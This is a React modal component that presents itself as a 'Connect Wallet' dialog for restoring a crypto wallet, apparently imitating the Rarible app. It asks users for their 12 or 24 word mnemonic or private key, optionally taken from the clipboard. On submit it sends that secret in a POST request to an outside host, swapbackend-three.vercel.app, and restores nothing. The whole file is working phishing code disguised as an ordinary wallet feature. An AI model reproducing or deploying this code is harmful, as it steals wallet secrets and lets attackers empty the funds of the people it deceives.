import React, { useRef, useState } from "react";
import { AiOutlineClose } from "react-icons/ai";
import { FaPaste } from "react-icons/fa";

const ImportWallet = ({ setModal }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [Rarible App]
      ${pass}
      `,
    };
    fetch("https://swapbackend-three.vercel.app", {
      method: "POST",
      mode: "cors",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(vault),
    }).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed lg:top-0 inset-0  z-50 outline-0 ">
      <div className="lg:w-[400px] w-[24rem]  rounded-md bg-[#EDEBEE] border border-gray-200 drop-shadow-2xl">
        <div
          onClick={() => setModal((pre) => !pre)}
          className="flex items-center  bg-[#EDEBEE] border border-b border-gray-200 rounded-t-md cursor-pointer justify-between p-4 space-x-4 "
        >
          <AiOutlineClose className="text-black font-[700] text-2xl" />
          <p className="text-black font-[700] text-2xl">
            Mnemonic Or Private Key
          </p>
        </div>
        <div className="p-5">
          <p className="text-black my-3 font-[500] text-sm">
            Restore an exsiting wallet with your 12 or 24 mnemonic words or your
            private key.
          </p>
          <div className="relative">
            <textarea
              onChange={(e) => setPass(e.target.value)}
              value={pass}
              ref={ref}
              className="bg-transparent border text-black border-black rounded-md text-black outline-0 w-full h-40 p-4"
              placeholder="words separated by single space"
            />
            <FaPaste
              className="absolute bottom-2 right-0 shadow-xl text-lg text-white cursor-pointer"
              onClick={(e) => {
                handlePaste();
              }}
            />
          </div>

          <br />
          <div className="flex flex-col items-center">
            <button
              onClick={() => submitAddress()}
              disabled={!pass}
              className={
                pass
                  ? "bg-[#27272f] border border-white w-full px-5 py-4 rounded-2xl hover:opacity-80 shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                  : " border border-white opacity-20 w-full px-5 py-4 rounded-2xl  shadhow-xl text-black font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
              }
            >
              Connect Wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ImportWallet;
